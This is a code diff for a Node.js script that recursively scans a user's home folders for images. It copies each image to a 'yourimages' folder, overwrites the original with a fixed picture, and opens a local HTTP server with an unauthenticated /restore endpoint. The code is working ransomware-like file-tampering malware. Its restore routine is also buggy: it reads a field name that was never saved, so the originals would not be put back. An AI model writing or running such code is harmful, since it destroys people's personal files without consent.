@@ -1,22 +1,72 @@
 import * as fs from 'fs'
 import os from 'os'
+import http from 'http'
+import exp from 'express'
+const app = exp()
 main()
 const imgRegex = new RegExp('\\.(jpg|jpeg|png|gif|bmp|svg)$', 'i');
 const fileRegex = new RegExp('.+\\..+$');
 
 async function main() {
+    if (!fs.existsSync('./db.json')) {
+        const data = []
+        fs.writeFileSync('db.json', JSON.stringify(data))
+    }
+    fireUpHTTP()
     let dirs = ['Desktop', 'Documents', 'Downloads', 'Music', 'Pictures', 'Videos']
     // parseFiles(`${os.homedir()}\\Downloads`)
     for (let dir of dirs) {
-        parseFiles(`${os.homedir()}\\${dir}`)
+        parseFiles(`${os.homedir()}\\${dir}`, dir)
     }
 }
 
-function replace(path) {
-    console.log(path)
+function fireUpHTTP() {
+    app.get('/restore', (req, res) => {
+        restore()
+        res.send('restoring now. :/')
+    })
+    const server = app.listen(6342, () => {
+        
+    })
+    console.log(server.address())
 }
 
-async function parseFiles(path) {
+function replace(path, fileName, dir) {
+    const backup = fs.readFileSync(path)
+    fs.mkdir(`${os.homedir()}\\yourimages\\${dir}`, (err) => {
+        console.log(err)
+    })
+    
+    fs.writeFileSync(`${os.homedir()}\\yourimages\\${dir}\\${fileName}`, backup)
+    pushToDB(fileName, path, `${os.homedir()}\\yourimages\\${dir}\\${fileName}`)
+    const file = fs.readFileSync('./img.jpg')
+    fs.writeFileSync(path, file, (err) => {
+        console.log(err)
+    })
+}
+
+function pushToDB(fileName, origPath, currentPath) {
+    const data = JSON.parse(fs.readFileSync('./db.json').toString())
+    data.push({
+        name: fileName,
+        original: origPath,
+        currentPath: currentPath
+    })
+    fs.writeFileSync('db.json', JSON.stringify(data))
+}
+
+function restore() {
+    const data = JSON.parse(fs.readFileSync('./db.json').toString())
+    for (let entry of data) {
+        let fileName = entry.name
+        let originalPath = entry.original
+        let currentPath = entry.current
+        let image = fs.readFileSync(currentPath)
+        fs.writeFileSync(originalPath, image)
+    }
+}
+
+async function parseFiles(path, dir) {
     await fs.readdir(path, (err, files) => {
         if (err != null) {
             console.error(err)
@@ -28,13 +78,13 @@ async function parseFiles(path) {
                 filesParsed.push(file)
             }
         }
-        for (let file of filesParsed) { replace(`${path}/${file}`) }
+        for (let file of filesParsed) { replace(`${path}/${file}`, file, dir) }
         for (let file of files) {
             const fspath = `${path}/${file}`
             var isFile = false
             fs.lstat(fspath, (er2, stats) => {
                 if (stats.isDirectory()) {
-                    parseFiles(`${path}/${file}`)
+                    parseFiles(`${path}/${file}`, dir)
                 }
             })
         }
